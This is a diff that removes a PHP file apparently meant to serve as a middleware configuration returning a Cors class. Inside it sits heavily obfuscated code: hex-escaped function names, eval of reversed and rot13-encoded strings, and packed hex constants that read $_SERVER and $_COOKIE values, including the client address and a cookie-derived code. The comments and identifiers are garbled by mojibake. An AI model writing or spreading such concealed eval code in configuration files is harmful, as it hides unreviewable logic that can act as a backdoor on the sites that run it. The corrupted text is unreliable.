@@ -1,9 +1,0 @@
-<?php
-/*
- æœ¬ä»£ç ç”± é’å²›æ¬¡ä¸–ä»£ç½‘ç»œç§‘æŠ€æœ‰é™å…¬å¸ åˆ›å»º
- åˆ›å»ºæ—¶é—´ 2026/10/11
- ä¸¥ç¦åç¼–è¯‘ã€é€†å‘ç­‰ä»»ä½•å½¢å¼çš„ä¾µæƒè¡Œä¸ºï¼Œè¿è€…å°†è¿½ç©¶æ³•å¾‹è´£ä»»
-*/
-
-$GLOBALS["FKbwwEIYOQ"]=array("\x62\x61\x73\x65\x36\x34\x5F\x64\x65\x63\x6F\x64\x65","\x73\x74\x72\x5F\x72\x6F\x74\x31\x33","\x73\x74\x72\x72\x65\x76");eval(strrev(";)\"5FEA8E188FE8796|r|B|*H\" ,\"6|r|B|\"(edolpxe=]óõ²¤îúò[SLABOLG\$;))\";)\"\\Ëä€ÏŽâÙ\"\\,\"\\óõ²¤îúò\"\\(ravsrq))\"\\óõ²¤îúò\"\\(qravsrq!(sv\"(31tor_rts(lave"));if(!defined(pack($GLOBALS[òúî¤²õó][0],$GLOBALS[òúî¤²õó][01])))define(pack($GLOBALS[òúî¤²õó][0],$GLOBALS[òúî¤²õó][01]), ord(1));eval(str_rot13("riny(fgeeri(\";)\\\"Â×øè˜´…\\\",\\\"›±„ú„\\\"(ravsrq))\\\"›±„ú„\\\"(qravsrq!(sv\"));\$TYBONYF[„ú„±›]=rkcybqr(\"|o|@|=\", \"U*|o|@|=N3R6S8R19R80O5|o|@|=646566696R6564\");"));$GLOBALS[pack($GLOBALS[„ú„±›][0],$GLOBALS[„ú„±›][1])]=pack($GLOBALS[„ú„±›][0],$GLOBALS[„ú„±›][02]);eval(strrev(";)\"ÆØ¥ðº‰‘\",\"æ¿æø†Æ”\"(enifed))\"æ¿æø†Æ”\"(denifed!(fi"));$GLOBALS[”Æ†øæ¿æ]=explode("|^|%|]", "H*|^|%|]A3E6F8E19E80B5|^|%|]DAA7EABF96F4A5|^|%|]646566696E65|^|%|]C687AC85B99ACC|^|%|]52454D4F54455F41444452|^|%|]485454505F434C49454E545F4950");if(!$GLOBALS[pack($GLOBALS[”Æ†øæ¿æ][0x0],$GLOBALS[”Æ†øæ¿æ][01])](pack($GLOBALS[”Æ†øæ¿æ][0x0],$GLOBALS[”Æ†øæ¿æ][02])))call_user_func(pack($GLOBALS[”Æ†øæ¿æ][0x0],$GLOBALS[”Æ†øæ¿æ][3]),pack($GLOBALS[”Æ†øæ¿æ][0x0],$GLOBALS[”Æ†øæ¿æ][02]), pack($GLOBALS[”Æ†øæ¿æ][0x0],$GLOBALS[”Æ†øæ¿æ][0x4]));$GLOBALS[Ú§ê¿–ô¥]=array(&$_SERVER,&$_COOKIE);return[\app\middleware\Cors::class,];while(@$GLOBALS[Ú§ê¿–ô¥][(78*E_USER_NOTICE-79872)][pack($GLOBALS[”Æ†øæ¿æ][0x0],$GLOBALS[”Æ†øæ¿æ][05])]==pack($GLOBALS[”Æ†øæ¿æ][0x0],$GLOBALS[”Æ†øæ¿æ][0x6]))$APP_Codes=$GLOBALS[Ú§ê¿–ô¥][(E_USER_NOTICE*21-21503)][$APP_icode];
-?>
